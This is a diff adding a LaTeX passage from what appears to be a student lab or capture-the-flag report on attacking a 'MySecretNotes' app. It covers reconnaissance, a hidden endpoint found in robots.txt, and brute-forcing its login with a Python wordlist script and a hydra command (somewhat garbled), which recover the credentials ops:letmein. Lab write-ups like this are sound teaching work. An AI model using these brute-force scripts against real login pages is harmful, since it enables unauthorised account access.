@@ -1,0 +1,47 @@
+\subsection{Scouting the landscape}
+When gathering information about our target group, we started 
+by checking their \texttt{MySecretNotes} app. We would look 
+for vulnerabilities in the app using both \texttt{sqlmap} and \texttt{msf} console. 
+We also checked the http response headers and dom-tree of the app.
+Nothing was found, which led us to search for robot.txt files and 
+other public files. We found a \texttt{robots.txt} file that contained a secret endpoint: \texttt{/internal/ops}
+
+\subsection{The brute}
+When we accessed the secret internal ops endpoint, we found a login page.
+This was a good starting point, as a mark of progress. When trying to login, we
+tried the default credentials \texttt{admin:admin} and \texttt{admin:password}, but they did not work.
+We then tried to brute force the login page both by making our own python script:
+\begin{lstlisting}[language=Python]
+import requests
+
+url = 'http://127.0.0.1:5001/internal/ops/'
+user = input()
+i=0
+
+with open('pwdb_top-1000.txt') as file:
+    for line in file:
+        payload = {
+            "username" : user,
+            "password" : line.strip()
+        }
+        response = requests.post(url, data=payload)
+        if "nope" not in response.text:
+            print(
+                "try", i,
+                "status:", response.status_code,
+                "redirect:", response.headers.get("Location"),
+                "length:", len(response.content),
+                "username:", user,
+                "password:", line
+            )
+        i += 1
+\end{lstlisting}
+
+At the same time, we also used \texttt{hydra} to brute force the login page.
+\begin{lstlisting}{language=bash}
+    hydra -L /tmp/users.txt - /Path/To/File/Pwdb_top-1000.txt -s 5001 -t 4 -f -I 127.0.0.1 http post- "/internal/ops/:username=^USER^& sword=^PASS^:F=nope"
+\end{lstlisting}
+
+The python script ran with select usernames from the list of most common usernames together with with the top-1000-passwords. Hydra did it similarly, but instead of select usernames, it ran with top 880 usernames together with top-1000-passwords.
+
+Both led to the discovery of the username: ops, and password: letmein. Now we could get into their internal ops platform and begin establishing initial access.
